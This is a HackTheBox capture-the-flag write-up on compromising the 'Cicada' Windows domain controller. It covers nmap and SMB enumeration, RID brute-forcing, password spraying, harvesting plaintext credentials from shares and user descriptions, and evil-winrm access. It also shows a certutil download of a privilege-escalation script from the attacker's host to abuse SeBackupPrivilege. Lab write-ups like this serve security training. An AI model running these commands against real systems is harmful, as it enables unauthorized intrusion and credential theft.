---
description: 20 Nov, 2024
---

# HackTheBox Machine - Cicada

IP: 10.10.11.35

Nmap scan results for 10.10.11.35 machine.&#x20;

Parameters:

* \`sV\` - Probe open ports to determine service/version info
* 'sC' - equivalent to --script=default
* 'Pn' - Treat all hosts as online -- skip host discovery
* '--max-rate=1000' - Send packets no faster than 1000 packets per second

```
nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 +04
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.098s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-18T13:23:35
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds
```

1. We find out that 10.10.11.35 host has cicada.htb domain.
2. The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities.

Listing NULL(unauthorized/anonymous) SMB SHARES

```
> smbclient --no-pass -L //10.10.11.35
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

After that I tried logging into these SMB shares. HR share was accessible without authorization and had a content inside.

```

> smbclient //10.10.11.35/HR -U " "%" "
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 16:29:09 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024

> smb: \> recurse ON
> smb: \> mget *
Get file Notice from HR.txt? yes
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

The contents of the file \`Notice From HR.txt\` included a message from the HR notifying the new employee about their default password, although username was not mentioned.

user default password: `Cicada$M6Corpb*@Lp#nZp!8`

now i need to guess which user's password is this.

I'm going to enumerate users by Brute-forcing RID's using NetExec tool

```
> nxc smb 10.10.11.35  -u guest -p '' --rid-brute
OR
> nxc smb 10.10.11.35  -u none -p '' --rid-brute
```

Both of the above produces the same result

```
SMB  10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB  10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Then i used AWK to get usernames separately for brute-forcing.

```
> cat enum_accs.txt | awk '{print $6}' > users.txt
> cat users.txt | awk -F "\\" '{print $2}' > usernames.txt
```

Which produces

```
guest:
Enterprise
Administrator
Guest
krbtgt
Domain
Domain
Domain
Domain
Domain
Cert
Schema
Enterprise
Group
Read-only
Cloneable
Protected
Key
Enterprise
RAS
Allowed
Denied
CICADA-DC$
DnsAdmins
DnsUpdateProxy
Groups
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
Dev
emily.oscars
```

Next i pass enumerated users and known passwords and see which account matches this password

```
> nxc smb 10.10.11.35 -u enum_users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

michael.wrightson account was a match.

Then we test user connection by listing network shares as an authorized user

```
> smbclient -L 10.10.11.35 -W cicada.htb -U michael.wrightson.
```

And it works!



Then, let's go ahead and login to RPC client as an authorized user and see what we can do or act on.

```
rpcclient 10.10.11.35 -U michael.wrightson%'Cicada$M6Corpb*@Lp#nZp!8' -W cicada.htb
```

And we got access to RPC session as an authorized user.

Now let's enumerate available users and groups on the system

```
rpcclient $> enumdomusers 
	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[john.smoulder] rid:[0x450]
	user:[sarah.dantelia] rid:[0x451]
	user:[michael.wrightson] rid:[0x452]
	user:[david.orelious] rid:[0x454]
	user:[emily.oscars] rid:[0x641]

rpcclient $> enumdomgroups
	group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
	group:[Domain Admins] rid:[0x200]
	group:[Domain Users] rid:[0x201]
	group:[Domain Guests] rid:[0x202]
	group:[Domain Computers] rid:[0x203]
	group:[Domain Controllers] rid:[0x204]
	group:[Schema Admins] rid:[0x206]
	group:[Enterprise Admins] rid:[0x207]
	group:[Group Policy Creator Owners] rid:[0x208]
	group:[Read-only Domain Controllers] rid:[0x209]
	group:[Cloneable Domain Controllers] rid:[0x20a]
	group:[Protected Users] rid:[0x20d]
	group:[Key Admins] rid:[0x20e]
	group:[Enterprise Key Admins] rid:[0x20f]
	group:[DnsUpdateProxy] rid:[0x44e]
	group:[Groups] rid:[0x44f]
	group:[Dev Support] rid:[0x455]

```

After querying each user I came across david.orelious Description. It contains users comment, which contains the password of the user.

```
rpcclient $> queryuser david.orelious
		User Name   :	david.orelious
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Just in case I forget my password is aRt$Lp#7t*VQ!3
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Fri, 15 Mar 2024 10:32:22 +04
	Logoff Time              :	Thu, 01 Jan 1970 04:00:00 +04
	Kickoff Time             :	Thu, 14 Sep 30828 06:48:05 +04
	Password last set Time   :	Thu, 14 Mar 2024 16:17:30 +04
	Password can change Time :	Fri, 15 Mar 2024 16:17:30 +04
	Password must change Time:	Thu, 14 Sep 30828 06:48:05 +04
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

Now, I can login to SMB DEV share with this account.

```
smbclient //10.10.11.35/DEV -U david.orelious%'aRt$Lp#7t*VQ!3' -W cicada.htb
```

Once session is established, we can see the ps1 script present on the share.

```
smb: \> dir
  .                                   D        0  Thu Mar 14 16:31:39 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 21:28:22 2024

		4168447 blocks of size 4096. 431820 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)

```

Let's examine `Backup_script.ps1`

```ps1
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

The script reveals another user's information. Namely, `emily.oscars` password is `Q!3@Lp#M6b*7t*Vt`

then I logged into Emily's user account in SMB

```
smbclient //10.10.11.35/C$ -U emily.oscars%'Q!3@Lp#M6b*7t*Vt' -W cicada.htb
```

and retrieved an user.txt flag from

`C:\Users\emily.oscars.CICADA\Desktop\user.txt`

***

Up until this point I got by without any help. Then I got stuck and looked up other people's approaches.

I got remote interactive shell access with `evil-winrm` to emily's user account.

```
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

I found out that emily.oscars has a permission `SeBackupPrivilege` which can be used to gain read access on any file on the system.

here's a script that allows just that: https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

Then I got this script uploaded to emily's workstation, which was hosted on my machine using python HTTP server.

```
certutil -urlcache -f http://10.10.14.167/privesc.ps1 privesc.ps1
```

Last step is to activate the script and read administrator folder.

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> . ./privesc.ps1

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

**user.txt - Acquired**&#x20;

**root.txt - Acquired**

Cicada machine has been pwned.
